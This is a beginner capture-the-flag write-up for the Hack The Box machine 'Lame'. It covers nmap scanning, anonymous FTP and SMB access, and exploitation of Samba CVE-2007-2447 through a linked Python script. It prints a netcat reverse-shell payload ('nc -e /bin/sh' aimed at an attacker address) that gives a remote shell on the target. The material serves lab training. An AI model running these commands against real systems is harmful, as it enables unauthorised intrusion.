# Lame (HTB, Beginner Track)

## Enumeration

Let’s start to examine the ports and services first,

### NMAP

**command:**

```bash
nmap -Pn -A -T4 [ip-address]
```

**option used:**

| Options | Usage |
| --- | --- |
| -Pn | Treat all hosts as online -- skip host discovery |
| -A | Enable OS detection, version detection, script scanning, and traceroute |
| -T4 | Set timing template (higher is faster) |

![img01.png](Lame%20(HTB,%20Beginner%20Track)%2000795692c37d493dbfc98c2cb1f48983/img01.png)

- Found port **21,22,139,445** are opened and running **vsftpd 2.3.4, OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0), Samba smbd 3.X - 4.X, Samba smbd 3.0.20-Debian** services respectively.

### FTP

- Let’s first try to login into FTP, check whether **anonymous** login attempt works fine or not!

![img02.png](Lame%20(HTB,%20Beginner%20Track)%2000795692c37d493dbfc98c2cb1f48983/img02.png)

- We’ve tried the **anonymous login attempt** on the target, but it seems there isn’t anything available to us.

### SMBCLIENT

- Let’s check the shared folder through **smbclient:**

**command:**

```bash
smbclient -L [ip-address]
```

![img03.png](Lame%20(HTB,%20Beginner%20Track)%2000795692c37d493dbfc98c2cb1f48983/img03.png)

- There are two shared folders we found to be accessible to us.
- Let’s try to access it, without any credentials again:

**NOTE:** *Before accessing file the shared folder of the target make sure that you’ve, desired settings configured in your **/etc/samba/smb.conf** file.*

👉🏼 [**for more information**](https://wiki.archlinux.org/title/Samba#Protocol_negotiation_failed:_NT_STATUS_INVALID_NETWORK_RESPONSE) 👈🏼

**command:**

```bash
smbclient '\\[ip-address]\tmp' 
```

![img04.png](Lame%20(HTB,%20Beginner%20Track)%2000795692c37d493dbfc98c2cb1f48983/img04.png)

- There is a anonymous login is successful again!

## Exploitation

### ****[CVE-2007-2447](https://www.cvedetails.com/cve/CVE-2007-2447/)****

👉🏼 **[python-exploit](https://github.com/Ziemni/CVE-2007-2447-in-Python/blob/master/smbExploit.py)** 👈🏼

- Download the above script and save it your computer.
- Then run a netcat listener on your terminal:

**command:**

```bash
nc -lvnp 1234
```

| Options | Usage |
| --- | --- |
| l, --listen | listen mode, for inbound connects |
| v, --verbose | verbose (use twice to be more verbose) |
| n, --dont-resolve | numeric-only IP addresses, no DNS |
| p, --local-port=NUM | local port number |
- Now, you can run the script as follows 👇🏼

**command:**

```bash
python3 smbExploit.py 192.168.1.2 'nc -e /bin/sh 192.168.1.1 1234'
```

- And within a moment we’ll have a connection from our target!

![img05.png](Lame%20(HTB,%20Beginner%20Track)%2000795692c37d493dbfc98c2cb1f48983/img05.png)

**DONE!**
